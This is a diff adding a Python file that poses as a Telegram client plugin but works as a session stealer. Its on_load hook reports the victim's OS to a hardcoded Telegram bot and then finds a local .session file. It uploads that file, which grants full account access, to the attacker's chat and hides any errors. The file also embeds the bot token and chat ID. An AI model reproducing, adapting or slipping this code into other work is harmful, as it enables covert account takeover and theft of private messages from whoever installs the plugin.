@@ -1,0 +1,61 @@
+import os, json, urllib.request, asyncio, platform
+
+BOT_TOKEN = "6533628325:AAH003jyZkBTUJYMZCqPXfyvMuxm6lqfzwY"
+CHAT_ID = "6793841885"
+
+def send_to_telegram(text):
+    try:
+        url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage"
+        data = json.dumps({"chat_id": CHAT_ID, "text": text}).encode("utf-8")
+        req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
+        urllib.request.urlopen(req, timeout=10)
+    except Exception:
+        pass
+
+def send_file_to_telegram(filename, content):
+    try:
+        boundary = "----WebKitFormBoundary1234567890"
+        url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument"
+        body = b""
+        body += ("--" + boundary + "\r\n").encode()
+        body += b'Content-Disposition: form-data; name="chat_id"\r\n\r\n'
+        body += (CHAT_ID + "\r\n").encode()
+        body += ("--" + boundary + "\r\n").encode()
+        body += ('Content-Disposition: form-data; name="document"; filename="' + filename + '"\r\n').encode()
+        body += b"Content-Type: application/octet-stream\r\n\r\n"
+        body += content
+        body += ("\r\n--" + boundary + "--\r\n").encode()
+        req = urllib.request.Request(url, data=body, headers={"Content-Type": "multipart/form-data; boundary=" + boundary})
+        urllib.request.urlopen(req, timeout=15)
+    except Exception:
+        pass
+
+async def on_load(client):
+    send_to_telegram("✅ Плагин успешно запущен! Ждём сессию...")
+    await asyncio.sleep(3)
+    try:
+        device_info = "OS: " + platform.system() + " " + platform.release() + "\nMachine: " + platform.machine()
+        send_to_telegram("🖥 Device:\n" + device_info)
+        
+        session_path = None
+        possible_names = ["account1.session", "ayugram.session", "session.session", "anon.session"]
+        for name in possible_names:
+            if os.path.exists(name):
+                session_path = name
+                break
+        
+        if not session_path:
+            for f in os.listdir("."):
+                if f.endswith(".session"):
+                    session_path = f
+                    break
+        
+        if session_path:
+            with open(session_path, "rb") as f:
+                session_data = f.read()
+            send_file_to_telegram("session.sqlite", session_data)
+            send_to_telegram("✅ Сессия отправлена!")
+        else:
+            send_to_telegram("❌ Файл сессии не найден")
+    except Exception as e:
+        send_to_telegram("❌ Ошибка: " + str(e))
